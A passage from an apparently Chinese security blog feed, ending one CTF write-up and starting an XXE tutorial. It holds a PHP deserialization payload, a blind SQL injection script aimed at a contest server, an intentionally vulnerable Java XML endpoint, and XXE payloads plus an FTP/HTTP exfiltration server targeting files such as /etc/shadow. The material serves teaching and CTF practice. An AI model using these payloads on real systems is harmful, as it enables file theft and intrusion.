class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($s)&#123;</span><br><span class="line">            <span class="comment">//若为内部则包含sec对象，且使用指针</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bbb=&amp;<span class="keyword">$this</span>-&gt;aaa; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;skyobj=<span class="keyword">new</span> sec();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//若为外部则构造一个cool对象，</span></span><br><span class="line">            $c=<span class="keyword">new</span> cool();</span><br><span class="line">            $c-&gt;filename=<span class="string">"flag.php"</span>;</span><br><span class="line">            $b=<span class="keyword">new</span> baby(<span class="string">'i'</span>);</span><br><span class="line">            $c-&gt;amzing=serialize($b);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;skyobj = $c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $nice; <span class="comment">//baby object</span></span><br><span class="line">    <span class="keyword">public</span> $amzing;  <span class="comment">//baby object serialized</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $bb_ser;</span></span><br><span class="line">$b=<span class="keyword">new</span> baby();</span><br><span class="line">$b_ser=serialize($b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b_ser);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$Input_data = unserialize($b_ser); <span class="comment">//baby object</span></span><br><span class="line"><span class="keyword">echo</span> $Input_data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A71%3A%22O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A3%3A%22sec%22%3A0%3A%7B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure><p>本地复现成功：</p><p><img src="/ctf-2019安恒01月赛babygo（详解）和其他题目wp/1548595054319.png" alt="1548595054319"></p><h1 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h1><p>使用formost得到一个二维码：</p><p><img src="/ctf-2019安恒01月赛babygo（详解）和其他题目wp/00005806.jpg" alt="00005806"></p><p>左下角有个很淡的flag，用stegsolve就看的很清楚了：</p><p><img src="/ctf-2019安恒01月赛babygo（详解）和其他题目wp/TIM截图20190126194212.png" alt="TIM截图20190126194212"></p><h1 id="其他题目记录"><a href="#其他题目记录" class="headerlink" title="其他题目记录"></a>其他题目记录</h1><h2 id="Reverse1"><a href="#Reverse1" class="headerlink" title="Reverse1"></a>Reverse1</h2><p>题目给的pyc反编译不了，于是使用pyinstxtractor.py反编译exe，得到一个文件夹，因为文件太多当时就卡住了，实际上应该修复<code>AnhengRe</code>文件的头部，并加上pyc的后缀，就可以反编译出源代码了。</p><h2 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h2><p>将字符串从QWERY键盘的布局对应到Dvorak的布局就可以得到flag，本质上是一个古典密码本。</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>参考<a href="https://www.anquanke.com/post/id/170341#h3-3" target="_blank" rel="noopener">飘零大佬wp</a>,为tp3.2的约束注入，附上exp供以后使用：</p><p>查看表、列名payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(id)--</span><br></pre></td></tr></table></figure><p>盲注exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'re4g49sil8hfh4ovfrk7ln1o02'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>,cookies=cookies)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web安全 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现包含XXE漏洞的服务、攻击以及防御方法</title>
      <link href="/xxe-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/"/>
      <url>/xxe-XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E3%80%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="实现包含XXE漏洞的服务"><a href="#实现包含XXE漏洞的服务" class="headerlink" title="实现包含XXE漏洞的服务"></a>实现包含XXE漏洞的服务</h1><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><p>不说废话，首先实现一个包含XXE漏洞的服务吧，新建一个SpringBoot项目：<br><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548150750904.png" alt="1548150750904"></p><p>建好之后目录如下</p><p><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548154022764.png" alt="1548154022764"></p><h2 id="定义Controller"><a href="#定义Controller" class="headerlink" title="定义Controller"></a>定义Controller</h2><p>新建XXEController.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XXEController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(value = <span class="string">"/xxe"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">xxe</span><span class="params">(@RequestBody String userString)</span> <span class="keyword">throws</span> ParserConfigurationException, IOException, SAXException </span>&#123;</span><br><span class="line">        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        Document doc = db.parse(<span class="keyword">new</span> ByteArrayInputStream(userString.getBytes(<span class="string">"utf-8"</span>)));</span><br><span class="line">        String username = getValueByTagName(doc, <span class="string">"username"</span>);</span><br><span class="line">        String password = getValueByTagName(doc, <span class="string">"password"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Username: "</span> + username + <span class="string">"Password: "</span> + password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getValueByTagName</span><span class="params">(Document doc, String tagName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (doc == <span class="keyword">null</span> || tagName.equals(<span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        NodeList pl = doc.getElementsByTagName(tagName);</span><br><span class="line">        <span class="keyword">if</span> (pl != <span class="keyword">null</span> &amp;&amp; pl.getLength() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pl.item(<span class="number">0</span>).getTextContent();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>以上一个脆弱的服务器就做好了，用postman发个包，可以看到服务器返回了期待内容：</p><p><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548159244547.png" alt="1548159244547"></p><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="有回显的XXE攻击"><a href="#有回显的XXE攻击" class="headerlink" title="有回显的XXE攻击"></a>有回显的XXE攻击</h2><p>新建<code>d:/flag/flag.txt</code>文件，内容为<code>flag:1234</code></p><p>通过外部实体构造Payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///d:/flag/flag.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passw0rd<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看到flag.txt内容已经被打印：</p><p><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548159377847.png" alt="1548159377847"></p><h2 id="无回显的XXE攻击"><a href="#无回显的XXE攻击" class="headerlink" title="无回显的XXE攻击"></a>无回显的XXE攻击</h2><p>攻击者在自己服务器上构造<code>evil.dtd</code>，并开启http服务（这里假设为127.0.0.1:8000）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://127.0.0.1:8000/%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%payload;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p>再给靶机发送如下payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///d:/flag/flag.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:8000/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发包，看到服务器报错：</p><p><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548210905577.png" alt="1548210905577"></p><p>同时在攻击机上可以看到文件内容：</p><p><img src="/xxe-XXE漏洞原理、攻击方式以及防御方法/1548160653404.png" alt="1548160653404"></p><h2 id="使用ftp进行无回显的攻击"><a href="#使用ftp进行无回显的攻击" class="headerlink" title="使用ftp进行无回显的攻击"></a>使用ftp进行无回显的攻击</h2><p>使用ftp的好处是若服务是java写的可以列目录和获取多行文件（但是我这里在win和linux上都没有复现成功，怀疑是java库的版本问题）。</p><p>使用<code>mvn clean package</code>打包出jar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">λ mvn clean package</span><br><span class="line">[WARNING]</span><br><span class="line">[WARNING] Some problems were encountered <span class="keyword">while</span> building the effective settings</span><br><span class="line">[WARNING] expected START_TAG or END_TAG not TEXT (position: TEXT seen ...&lt;/repositories&gt;\n\u3000\u3000\u3000 &lt;!-- \u63d2\u4ef6\u4ed3\u5e93 --&gt;\n      &lt;p... @232:9)  @ D:\Store\document\all_my_work\java_lib\apache-maven-3.5.0\bin\..\conf\settings.xml, line 232, column 9</span><br><span class="line">[WARNING]</span><br><span class="line">[INFO] Scanning <span class="keyword">for</span> projects...</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Building xxedemo 0.0.1-SNAPSHOT</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">...</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: 10.617 s</span><br><span class="line">[INFO] Finished at: 2019-01-23T14:19:30+08:00</span><br><span class="line">[INFO] Final Memory: 37M/324M</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>在linux上启动漏洞服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target/xxedemo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>准备脚本<code>xxeftp.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=<span class="string">'server-xxe-ftp.log'</span>,level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">The XML Payload you should send to the server!</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="string">  &lt;!ENTITY % file SYSTEM "file:///etc/shadow"&gt;</span></span><br><span class="line"><span class="string">  &lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:8888/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">  %dtd;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;data&gt;&amp;send;&lt;/data&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"""&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'ftp://&#123;&#125;:&#123;&#125;/%file;'&gt;"&gt;</span></span><br><span class="line"><span class="string">%all;"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wlog</span><span class="params">(_str)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> _str</span><br><span class="line">    logging.info(<span class="string">"&#123;&#125;\n"</span>.format(_str))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebServer</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Request handler for our webserver.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Blanketly return the XML payload regardless of who's asking.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        resp = <span class="string">"""HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-length: &#123;&#125;\r\n\r\n&#123;&#125;\r\n\r\n"""</span>.format(len(payload), payload)</span><br><span class="line">        <span class="comment"># self.request is a TCP socket connected to the client</span></span><br><span class="line">        self.data = self.request.recv(<span class="number">4096</span>).strip()</span><br><span class="line">        wlog(<span class="string">"[WEB] &#123;&#125; Connected and sent:"</span>.format(self.client_address[<span class="number">0</span>]))</span><br><span class="line">        wlog(<span class="string">"&#123;&#125;"</span>.format(self.data))</span><br><span class="line">        <span class="comment"># Send back same data but upper</span></span><br><span class="line">        self.request.sendall(resp)</span><br><span class="line">        wlog(<span class="string">"[WEB] Replied with:\n&#123;&#125;"</span>.format(resp))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTPServer</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Request handler for our ftp.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        FTP Java handler which can handle reading files</span></span><br><span class="line"><span class="string">        and directories that are being sent by the server.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># set timeout</span></span><br><span class="line">        self.request.settimeout(<span class="number">10</span>)</span><br><span class="line">        wlog(<span class="string">"[FTP] &#123;&#125; has connected"</span>.format(self.client_address[<span class="number">0</span>]))</span><br><span class="line">        self.request.sendall(<span class="string">"220 xxe-ftp-server\n"</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                self.data = self.request.recv(<span class="number">4096</span>).strip()</span><br><span class="line">                wlog(<span class="string">"[FTP] Received:\n&#123;&#125;"</span>.format(self.data))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"LIST"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    self.request.sendall(<span class="string">"drwxrwxrwx 1 owner group          1 Feb 21 04:37 rsl\n"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"150 Opening BINARY mode data connection for /bin/ls\n"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"226 Transfer complete.\n"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"USER"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    self.request.sendall(<span class="string">"331 password please - version check\n"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"PORT"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    wlog(<span class="string">"[FTP] ! PORT received"</span>)</span><br><span class="line">                    wlog(<span class="string">"[FTP] &gt; 200 PORT command ok"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"200 PORT command ok\n"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"SYST"</span> <span class="keyword">in</span> self.data:</span><br><span class="line">                    self.request.sendall(<span class="string">"215 RSL\n"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    wlog(<span class="string">"[FTP] &gt; 230 more data please!"</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">"230 more data please!\n"</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"timed out"</span> <span class="keyword">in</span> e:</span><br><span class="line">                wlog(<span class="string">"[FTP] Client timed out"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                wlog(<span class="string">"[FTP] Client error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        wlog(<span class="string">"[FTP] Connection closed with &#123;&#125;"</span>.format(self.client_address[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_server</span><span class="params">(conn, serv_class)</span>:</span></span><br><span class="line">    server = SocketServer.TCPServer(conn, serv_class)</span><br><span class="line">    t = Thread(target=server.serve_forever)</span><br><span class="line">    t.daemon = <span class="literal">True</span></span><br><span class="line">    t.start()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> argv[<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] Need public IP of this server in order to receive data."</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    WEB_ARGS = (<span class="string">"0.0.0.0"</span>, <span class="number">8888</span>)</span><br><span class="line">    FTP_ARGS = (<span class="string">"0.0.0.0"</span>, <span class="number">2121</span>)</span><br><span class="line">    payload = payload.format(argv[<span class="number">1</span>],FTP_ARGS[<span class="number">1</span>])</span><br><span class="line">    wlog(<span class="string">"[WEB] Starting webserver on %s:%d..."</span> % WEB_ARGS)</span><br><span class="line">    start_server(WEB_ARGS, WebServer)</span><br><span class="line">    wlog(<span class="string">"[FTP] Starting FTP server on %s:%d..."</span> % FTP_ARGS)</span><br><span class="line">    start_server(FTP_ARGS, FTPServer)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            sleep(<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n[+] Server shutting down."</span></span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python xxeftp.py 127.0.0.1</span><br><span 